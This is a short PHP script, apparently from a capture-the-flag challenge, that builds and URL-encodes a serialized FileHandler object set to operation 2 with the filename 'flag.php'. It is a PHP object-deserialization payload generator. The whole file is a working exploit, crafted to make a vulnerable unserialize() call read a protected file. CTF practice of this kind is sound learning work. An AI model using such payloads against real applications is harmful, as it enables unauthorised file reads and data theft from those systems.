<?php
	class FileHandler{
    public $op = 2;
    public $filename = 'flag.php';
    public $content = 'a';
  }
  echo urlencode(serialize(new FileHandler()));
?>